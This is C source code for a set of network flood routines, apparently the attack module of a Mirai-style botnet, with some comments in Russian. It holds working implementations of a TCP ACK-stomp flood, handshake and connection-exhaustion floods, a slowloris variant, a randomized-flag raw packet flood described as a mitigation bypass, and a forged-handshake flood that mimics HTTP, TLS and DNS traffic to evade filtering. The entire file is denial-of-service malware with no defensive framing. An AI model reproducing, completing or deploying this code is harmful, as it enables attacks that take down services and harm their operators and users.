#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"


void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    struct attack_stomp_data *stomp_data = calloc(targs_len, sizeof (struct attack_stomp_data));
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    // Set up receive socket
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Could not open raw socket!\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(rfd);
        return;
    }

    // Retrieve all ACK/SEQ numbers
    for (i = 0; i < targs_len; i++)
    {
        int fd;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[256];
        time_t start_recv;

        stomp_setup_nums:

        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create socket!\n");
#endif
            continue;
        }

        // Set it in nonblocking mode
        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
 
        // Set up address to connect to
        addr.sin_family = AF_INET;
        if (targs[i].netmask < 32)
            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        else
            addr.sin_addr.s_addr = targs[i].addr;
        if (dport == 0xffff)
            addr.sin_port = rand_next() & 0xffff;
        else
            addr.sin_port = htons(dport);

        // Actually connect, nonblocking
        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
        start_recv = time(NULL);

        // Get info
        while (TRUE)
        {
            int ret;

            recv_addr_len = sizeof (struct sockaddr_in);
            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
            if (ret == -1)
            {
#ifdef DEBUG
                printf("Could not listen on raw socket!\n");
#endif
                return;
            }
            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
            {
                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr));

                if (tcph->source == addr.sin_port)
                {
                    if (tcph->syn && tcph->ack)
                    {
                        struct iphdr *iph;
                        struct tcphdr *tcph;
                        char *payload;

                        stomp_data[i].addr = addr.sin_addr.s_addr;
                        stomp_data[i].seq = ntohl(tcph->seq);
                        stomp_data[i].ack_seq = ntohl(tcph->ack_seq);
                        stomp_data[i].sport = tcph->dest;
                        stomp_data[i].dport = addr.sin_port;
#ifdef DEBUG
                        printf("ACK Stomp got SYN+ACK!\n");
#endif
                        // Set up the packet
                        pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph = (struct iphdr *)pkts[i];
                        tcph = (struct tcphdr *)(iph + 1);
                        payload = (char *)(tcph + 1);

                        iph->version = 4;
                        iph->ihl = 5;
                        iph->tos = ip_tos;
                        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph->id = htons(ip_ident);
                        iph->ttl = ip_ttl;
                        if (dont_frag)
                            iph->frag_off = htons(1 << 14);
                        iph->protocol = IPPROTO_TCP;
                        iph->saddr = LOCAL_ADDR;
                        iph->daddr = stomp_data[i].addr;

                        tcph->source = stomp_data[i].sport;
                        tcph->dest = stomp_data[i].dport;
                        tcph->seq = stomp_data[i].ack_seq;
                        tcph->ack_seq = stomp_data[i].seq;
                        tcph->doff = 8;
                        tcph->fin = TRUE;
                        tcph->ack = TRUE;
                        tcph->window = rand_next() & 0xffff;
                        tcph->urg = urg_fl;
                        tcph->ack = ack_fl;
                        tcph->psh = psh_fl;
                        tcph->rst = rst_fl;
                        tcph->syn = syn_fl;
                        tcph->fin = fin_fl;

                        rand_str(payload, data_len);
                        break;
                    }
                    else if (tcph->fin || tcph->rst)
                    {
                        close(fd);
                        goto stomp_setup_nums;
                    }
                }
            }

            if (time(NULL) - start_recv > 10)
            {
#ifdef DEBUG
                printf("Couldn't connect to host for ACK Stomp in time. Retrying\n");
#endif
                close(fd);
                goto stomp_setup_nums;
            }
        }
    }

    // Start spewing out traffic
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;

            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            tcph->seq = htons(stomp_data[i].seq++);
            tcph->ack_seq = htons(stomp_data[i].ack_seq);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

void attack_tcp_handshake(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 8);
    int duration = attack_get_opt_int(opts_len, opts, ATK_OPT_DURATION, 60);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;

    time_t start = time(NULL);

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int t;
            for (t = 0; t < threads; t++)
            {
                int fd = socket(AF_INET, SOCK_STREAM, 0);
                if (fd < 0)
                    continue;

                fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);

                if (targs[i].netmask < 32)
                    addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    addr.sin_addr.s_addr = targs[i].addr;
                addr.sin_port = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);

                // полный tcp handshake
                connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

                // ждем установления соединения
                usleep(10000);
                
                // отправляем данные
                    char payload[1024];
                    int j;
                    for (j = 0; j < (int)sizeof(payload); j++) payload[j] = rand_next() & 0xff;
                    send(fd, payload, sizeof(payload), MSG_NOSIGNAL);

                // корректно закрываем соединение
                shutdown(fd, SHUT_WR);
                usleep(5000);
                close(fd);
            }
        }
        if (time(NULL) - start >= duration)
            break;
        usleep(500);
    }
}

void attack_tcp_connexhaust(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    int max_conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1000);
    int duration = attack_get_opt_int(opts_len, opts, ATK_OPT_DURATION, 60);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);

    int *fds = calloc(max_conns, sizeof(int));
    if (fds == NULL)
        return;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;

    time_t start = time(NULL);

    while (TRUE)
    {
        int idx = 0;
        for (i = 0; i < targs_len && idx < max_conns; i++)
        {
            int r;
            for (r = 0; r < max_conns / targs_len && idx < max_conns; r++)
            {
                int fd = socket(AF_INET, SOCK_STREAM, 0);
                if (fd < 0)
                    continue;
                fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);

                if (targs[i].netmask < 32)
                    addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    addr.sin_addr.s_addr = targs[i].addr;
                addr.sin_port = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);

                connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

                fds[idx++] = fd;
            }
        }

        {
            int k;
            char payload[512];
            for (k = 0; k < (int)sizeof(payload); k++) payload[k] = rand_next() & 0xff;
            for (k = 0; k < idx; k++)
            {
                if (fds[k] > 0)
                    send(fds[k], payload, sizeof(payload), MSG_NOSIGNAL);
            }
        }

        {
            int closeN = idx / 3;
            int k;
            for (k = 0; k < closeN; k++)
            {
                if (fds[k] > 0)
                {
                    close(fds[k]);
                    fds[k] = -1;
                }
            }
        }

        if (time(NULL) - start >= duration)
            break;

        usleep(1000);
    }

    for (i = 0; i < max_conns; i++)
        if (fds[i] > 0) close(fds[i]);
    free(fds);
}

void attack_slowloris_tcp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    int max_conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 500);
    int duration = attack_get_opt_int(opts_len, opts, ATK_OPT_DURATION, 60);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);

    int *fds = calloc(max_conns, sizeof(int));
    if (fds == NULL)
        return;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;

    time_t start = time(NULL);

    // создаем соединения
    int idx = 0;
    for (i = 0; i < targs_len && idx < max_conns; i++)
    {
        int r;
        for (r = 0; r < max_conns / targs_len && idx < max_conns; r++)
        {
            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd < 0)
                continue;
            fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);

            if (targs[i].netmask < 32)
                addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            else
                addr.sin_addr.s_addr = targs[i].addr;
            addr.sin_port = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);

            connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
            fds[idx++] = fd;
        }
    }

    usleep(100000);

    // медленно отправляем данные
    while (time(NULL) - start < duration)
    {
        for (i = 0; i < idx; i++)
        {
            if (fds[i] > 0)
            {
                char slowpayload[64];
                int len = rand_next() % 32 + 16;
                rand_str(slowpayload, len);
                if (send(fds[i], slowpayload, len, MSG_NOSIGNAL) <= 0)
                {
                    close(fds[i]);
                    // пересоздаем соединение
                    fds[i] = socket(AF_INET, SOCK_STREAM, 0);
                    if (fds[i] >= 0)
                    {
                        fcntl(fds[i], F_SETFL, fcntl(fds[i], F_GETFL, 0) | O_NONBLOCK);
                        if (targs[i % targs_len].netmask < 32)
                            addr.sin_addr.s_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));
                        else
                            addr.sin_addr.s_addr = targs[i % targs_len].addr;
                        addr.sin_port = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);
                        connect(fds[i], (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
                    }
                }
            }
        }
        usleep(rand_next() % 5000 + 1000);
    }

    for (i = 0; i < max_conns; i++)
        if (fds[i] > 0) close(fds[i]);
    free(fds);
}

void attack_rs_media(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;

    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(rfd);
        return;
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char packet[1024];
            struct iphdr *iph = (struct iphdr *)packet;
            struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
            char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);

            // rs media bypass техники
            iph->version = 4;
            iph->ihl = 5;
            iph->tos = ip_tos;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
            iph->id = (ip_ident == 0xffff) ? rand_next() & 0xffff : htons(ip_ident);
            iph->frag_off = 0;
            iph->ttl = ip_ttl;
            iph->protocol = IPPROTO_TCP;
            iph->check = 0;
            iph->saddr = LOCAL_ADDR;

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            else
                iph->daddr = targs[i].addr;

            tcph->source = (sport == 0xffff) ? rand_next() & 0xffff : htons(sport);
            tcph->dest = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);
            tcph->seq = htonl(rand_next());
            tcph->ack_seq = 0;
            tcph->doff = 5;
            // rs media bypass - случайные флаги
            tcph->syn = (rand_next() % 2) ? 1 : 0;
            tcph->ack = (rand_next() % 2) ? 1 : 0;
            tcph->psh = (rand_next() % 2) ? 1 : 0;
            tcph->fin = (rand_next() % 3 == 0) ? 1 : 0;
            tcph->rst = (rand_next() % 5 == 0) ? 1 : 0;
            tcph->window = htons(rand_next() & 0xffff);
            tcph->check = 0;
            tcph->urg_ptr = 0;

            if (data_rand)
                rand_str(data, data_len);

            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}

void attack_socket_flood(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd, listen_fd;
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 32);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);

    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;

    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        close(rfd);
        return;
    }

    // создаем listening socket для получения syn-ack
    if ((listen_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        close(rfd);
        return;
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int t;
            for (t = 0; t < threads; t++)
            {
                char packet[2048];
                struct iphdr *iph = (struct iphdr *)packet;
                struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
                char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
                
                ipv4_t target_ip;
                if (targs[i].netmask < 32)
                    target_ip = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    target_ip = targs[i].addr;

                port_t src_port = (sport == 0xffff) ? (rand_next() % 60000 + 1024) : sport;
                port_t dst_port = (dport == 0xffff) ? 80 : dport;
                uint32_t seq = rand_next();

                // этап 1: отправка syn (легитимный)
                iph->version = 4;
                iph->ihl = 5;
                iph->tos = ip_tos;
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
                iph->id = htons(rand_next() & 0xffff);
                iph->frag_off = htons(0x4000); // dont fragment
                iph->ttl = ip_ttl;
                iph->protocol = IPPROTO_TCP;
                iph->check = 0;
                iph->saddr = LOCAL_ADDR;
                iph->daddr = target_ip;

                tcph->source = htons(src_port);
                tcph->dest = htons(dst_port);
                tcph->seq = htonl(seq);
                tcph->ack_seq = 0;
                tcph->doff = 5;
                tcph->syn = 1;
                tcph->ack = 0;
                tcph->psh = 0;
                tcph->rst = 0;
                tcph->fin = 0;
                tcph->urg = 0;
                tcph->window = htons(65535);
                tcph->check = 0;
                tcph->urg_ptr = 0;

                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

                targs[i].sock_addr.sin_port = htons(dst_port);
                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));

                usleep(500);

                // этап 2: отправка ack (завершение handshake)
                tcph->syn = 0;
                tcph->ack = 1;
                tcph->seq = htonl(seq + 1);
                tcph->ack_seq = htonl(rand_next()); // любой номер для ack
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));

                // этап 3: отправка данных (легитимный payload)
                int payload_size = data_len;
                if (payload_size > 1400)
                    payload_size = 1400;

                // генерируем легитимные данные под протокол
                if (dst_port == 80 || dst_port == 8080 || dst_port == 8888)
                {
                    // http трафик
                    char *http_req = "GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n";
                    int http_len = util_strlen(http_req);
                    util_memcpy(data, http_req, http_len);
                    payload_size = http_len;
                }
                else if (dst_port == 443 || dst_port == 8443)
                {
                    // имитация tls client hello
                    data[0] = 0x16; // handshake
                    data[1] = 0x03; data[2] = 0x01; // tls 1.0
                    data[3] = 0x00; data[4] = 0x9c; // length
                    for (int k = 5; k < payload_size; k++)
                        data[k] = rand_next() & 0xff;
                }
                else if (dst_port == 53)
                {
                    // dns query
                    data[0] = rand_next() & 0xff; data[1] = rand_next() & 0xff; // transaction id
                    data[2] = 0x01; data[3] = 0x00; // flags
                    data[4] = 0x00; data[5] = 0x01; // questions
                    for (int k = 6; k < payload_size; k++)
                        data[k] = rand_next() & 0xff;
                }
                else
                {
                    // обычный трафик (паттерн а не рандом)
                    for (int k = 0; k < payload_size; k++)
                        data[k] = (k % 94) + 33; // печатные символы
                }

                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size);
                tcph->seq = htonl(seq + 1);
                tcph->psh = 1; // push данных
                tcph->check = 0;
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + payload_size), sizeof(struct tcphdr) + payload_size);

                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));

                // отправляем несколько пакетов данных
                int bursts = rand_next() % 4 + 2;
                for (int b = 0; b < bursts; b++)
                {
                    seq += payload_size;
                    tcph->seq = htonl(seq + 1);
                    
                    // варьируем размер
                    int burst_size = rand_next() % 512 + 128;
                    if (burst_size > 1400)
                        burst_size = 1400;
                    
                    for (int k = 0; k < burst_size; k++)
                        data[k] = (k % 94) + 33;
                    
                    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + burst_size);
                    iph->check = 0;
                    tcph->check = 0;
                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + burst_size), sizeof(struct tcphdr) + burst_size);
                    
                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + burst_size, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                    
                    usleep(100);
                }

                // этап 4: корректное закрытие (fin)
                tcph->psh = 0;
                tcph->fin = 1;
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
                iph->check = 0;
                tcph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                
                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            }
        }
        usleep(10);
    }

    close(listen_fd);
    close(rfd);
}
